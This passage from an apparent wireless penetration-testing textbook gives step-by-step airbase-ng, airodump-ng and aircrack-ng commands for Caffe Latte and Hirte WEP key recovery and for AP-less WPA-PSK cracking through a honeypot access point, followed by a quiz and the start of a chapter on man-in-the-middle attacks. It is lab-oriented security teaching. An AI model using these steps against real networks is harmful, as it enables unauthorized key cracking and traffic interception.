    where the filename is the name of the file created by **airodump-ng**.


    We were successful in retrieving the WEP key from just the wireless client without
    requiring an actual access point to be used or present in the vicinity. This is
    the power of the Caffe Latte attack.


    In basic terms, a WEP access point doesn''t need to prove to a client that it
    knows the WEP key in order to receive encrypted traffic. The first piece of'
- md: 'traffic that will always be sent to a router upon connecting to a new network
    will be an ARP request to ask for an IP. The attack works by bit flipping and
    replaying ARP packets sent by the wireless client post association with the fake
    access point created by us. These bit flipped ARP Request packets cause more ARP
    response packets to be sent by the wireless client. Bit-flipping takes an encrypted
    value and alters it to create a different encrypted value. In this circumstance,
    we can take an encrypted ARP request and create an ARP response with a high degree
    of accuracy. Once we send back a valid ARP response, we can replay this value
    over and over again to generate the traffic we need to decrypt the WEP key.


    > Note that all these packets are encrypted using the WEP key stored on the client.
    Once we are able to gather a large number of these data packets, aircrack-NG is
    able to recover the WEP key easily.


    > Try changing the WEP key and repeat the attack. This is a difficult attack and
    requires some practice to orchestrate successfully. It would also be a good idea
    to use Wireshark and examine the traffic on the wireless network.


    ## The Hirte attack


    We''ve already seen how to conduct the Caffe Latte attack. The Hirte attack extends
    the Caffe Latte attack using fragmentation techniques and allows almost any packet
    to be used.


    - 1. Create a WEP access point exactly as in the Caffe Latte attack using the
    airbase-ng tool. The only additional option is the -N option instead of the -L
    option to launch the Hirte attack:

    ```

    root@kali:~# airbase-ng -c 3 -a E8:94:F6:62:1E:8E -e "Wireless Lab" -L -W 1 mon0

    ```


    - 2. Start airodump-ng in a separate window to capture packets for the **Wireless
    Lab Honeypot**:

    ```

    root@kali:~# airodump-ng -c 3 --bssid 80:1F:02:8F:34:D5 --write Hirte mon0

    ```


    - 3. Now, airodump-ng will start monitoring this network and storing the packets
    in the Hirte-01.cap file:

    ```

    CH 3 ][ Elapsed: 0 s ][ 2014-11-08 16:54 ][ fixed channel mon0: -1

    ```

    | BSSID              | PWR | RXQ | Beacons | #Data, | #/s | CH | MI | INC | CIPHER
    | AUTH | ESSID |

    |--------------------|-----|-----|---------|--------|-----|----|----|-----|--------|------|-------|

    | 80:1F:02:8F:34:D5  | 0   | 100 | 32      | 0      | 0   | 3  | 54 | WEP | WEP    |
    W    |       |


    | BSSID | STATION | PWR | Rate | Lost | Frames | Probe |

    |-------|---------|-----|------|------|--------|-------|

    |       |         |     |      |      |        |       |


    - 4. Once the roaming client connects to our Honeypot AP, the Hirte attack is
    automatically launched by **airbase-ng**:

    ```

    root@kali:~# airbase-ng -c 3 -e "Wireless Lab" -W 1 -N mon0

    16:52:48 Created tap interface at0

    16:52:48 Trying to set MTU on at0 to 1500

    16:52:48 Access Point with BSSID 80:1F:02:8F:34:D5 started.

    Error: Got channel -1, expected a value > 0.

    16:53:31 Client 00:EE:BD:B3:62:DE associated (WEP) to ESSID: "Wireless Lab"

    16:55:03 Client 00:EE:BD:B3:62:DE associated (WEP) to ESSID: "Wireless Lab"

    16:55:07 Starting Hirte attack against 00:EE:BD:B3:62:DE at 100 pps.

    ```


    - 5. We start aircrack-ng as in the case of the Caffe Latte attack and eventually,
    the key will be cracked.


    We launched the Hirte attack against a WEP client that was isolated and away from
    the authorized network. We cracked the key exactly the same way as in the Caffe
    Latte attack case. We recommend setting different WEP keys on the client and trying
    this exercise a couple of times to gain confidence. You may notice many times
    that you may have to reconnect the client to get it to work.


    ## AP-less WPA-Personal cracking


    In Chapter 4, we saw how to crack WPA/WPA2 PSK using aircrack-ng. The basic idea
    was to capture a four-way WPA handshake and then launch a dictionary attack. The
    question is: Would it be possible to crack WPA-Personal with just the client?
    No access point!

    ![](img/f62f3d8a0c2560e2bb8d8daaee6b9939_112_0.png)


    To crack WPA, we need the following four parameters from the four-way handshake—
    Authenticator Nonce, Supplicant Nonce, Authenticator MAC, and Supplicant MAC.
    Now, the interesting thing is that we do not need all of the four packets in the
    handshake to extract this information. We can get this information with four packets;
    packets 1 and 2 or just packets 2 and 3. In order to crack WPA-PSK, we will bring
    up a WPA-PSK Honeypot and, when the client connects to us, only Message 1 and
    Message 2 will come through. As we do not know the passphrase, we cannot send
    Message 3. However, Message 1 and Message 2 contain all the information required
    to begin the key cracking process:

    ![](img/f62f3d8a0c2560e2bb8d8daaee6b9939_113_0.png)


    Let''s start our job!


    - 1. We will set up a WPA-PSK Honeypot with the ESSID **Wireless Lab**. The `-z
    2` option creates a WPA-PSK access point, which uses TKIP:

    ```

    root@kali:~# airbase-ng -c 3 -e "Wireless Lab" -W 1 -z 2 mon0

    16:56:44 Created tap interface at0

    16:56:44 Trying to set MTU on at0 to 1500

    16:56:44 Access Point with BSSID 80:1F:02:8F:34:D5 started.

    Error: Got channel -1, expected a value > 0.

    ```


    - 2. Let''s also start **airodump-ng** to capture packets from this network:

    ```

    root@kali:~# airodump-ng -c 3 --bssid 80:1F:02:8F:34:D5 --write AP-less-WPA-cracking
    mon0

    ```


    - 3. Now when our roaming client connects to this access point, it starts the
    handshake but fails to complete it after Message 2, as discussed previously; however,
    the data required to crack the handshake has been captured.


    - 4. We run the airodump-ng capture file through aircrack-ng with the same dictionary
    file as before; eventually, the passphrase is cracked as before.


    ## Quiz – Attacking the client


    Q1. What encryption key can the Caffe Latte attack recover?

    - 1. None

    - 2. WEP

    - 3. WPA

    - 4. WPA2


    Q2. What would a Honeypot access point typically use?

    - 1. No Encryption, Open Authentication

    - 2. No Encryption, Shared Authentication

    - 3. WEP Encryption, Open Authentication

    - 4. None of the above


    Q3. Which one of the following is a DoS Attack?

    - 1. Mis-Association attacks

    - 2. Deauthentication attacks

    - 3. Disassociation attacks

    - 4. Both 2 and 3


    Q4. What does the Caffe Latte attack require?

    - 1. That the wireless client be in radio range of the access point

    - 2. That the client contains a cached and stored WEP key

    - 3. WEP encryption with at least 128-bit encryption

    - 4. Both 1 and 3


    ## Summary


    In this chapter, we learned that even the wireless client is susceptible to attacks.
    These include the Honeypot and other Mis-Association attacks; Caffe Latte attack
    to retrieve the key from the wireless client; deauthentication and disassociation
    attacks causing a Denial of service, Hirte attack as an alternative to retrieve
    the WEP key from a roaming client; and, finally, cracking the WPA-Personal passphrase
    with just the client.


    ## Chapter 7: Advanced Wireless Attacks


    As a penetration tester, it is important to know the advanced attacks a hacker
    can do, even if you might not check or demonstrate them during a penetration test.
    This chapter is dedicated to showing how a hacker can conduct advanced attacks
    using wireless access as the starting point. In this chapter, we will take a look
    at how we can conduct advanced attacks using what we have learned so far. We will
    primarily focus on the **man-in-the-middle attack (MITM)**, which requires a certain
    amount of skill and practice to conduct successfully. Once we have done this,
    we will use this **MITM** attack as a base from which to conduct more sophisticated
    attacks such as Eavesdropping and session hijacking. In this chapter, we will
    cover the following topics:


    - MITM attack

    - Wireless Eavesdropping using MITM

    - Session hijacking using MITM


    ## A man-in-the-middle attack


    MITM attacks are probably one of the most potent attacks on a WLAN system. There
    are different configurations that can be used to conduct the attack. We will use
    the most common one—the attacker is connected to the Internet using a wired LAN
    and is creating a fake access point on his client card. This access point broadcasts
    an SSID similar to a local hotspot in the vicinity. A user may accidentally get
    connected to this fake access point (or can be forced to via the higher signal
    strength theory we discussed in the previous chapters) and may continue to believe
    that he is connected to the legitimate access point. The attacker can now transparently
    forward all the user''s traffic over the Internet using the bridge he has created
    between the wired and wireless interfaces.'
